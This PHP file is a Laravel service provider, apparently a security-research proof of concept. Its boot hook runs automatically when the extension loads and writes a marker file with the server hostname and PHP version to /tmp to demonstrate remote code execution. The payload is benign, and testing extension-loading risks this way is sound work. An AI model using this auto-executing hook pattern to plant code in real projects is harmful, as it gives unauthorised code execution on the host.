<?php

namespace App\Extensions\SecurityResearch\MaliciousPoc;

use Illuminate\Support\ServiceProvider as LaravelServiceProvider;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\File;

class ServiceProvider extends LaravelServiceProvider
{
    public function register()
    {
        Log::info('[SecurityResearchMaliciousPoc] Service provider registered');
    }

    public function boot()
    {
        Log::info('[SecurityResearchMaliciousPoc] Service provider booting - RCE demonstration');


        $markerPath = '/tmp/g7_poc_marker_' . uniqid() . '.txt';
        $nonce = bin2hex(random_bytes(8));

        try {
            // Write marker file to prove RCE
            file_put_contents($markerPath, "G7_RCE_POC_DEMONSTRATED: {$nonce}\n");
            file_put_contents($markerPath, "Timestamp: " . date('Y-m-d H:i:s') . "\n");
            file_put_contents($markerPath, "Server: " . gethostname() . "\n");
            file_put_contents($markerPath, "PHP Version: " . PHP_VERSION . "\n");

            Log::info("[SecurityResearchMaliciousPoc] RCE demonstrated - marker written to {$markerPath}");
            Log::info("[SecurityResearchMaliciousPoc] Nonce: {$nonce}");

        } catch (\Exception $e) {
            Log::error("[SecurityResearchMaliciousPoc] Failed to write marker: " . $e->getMessage());
        }
    }
}
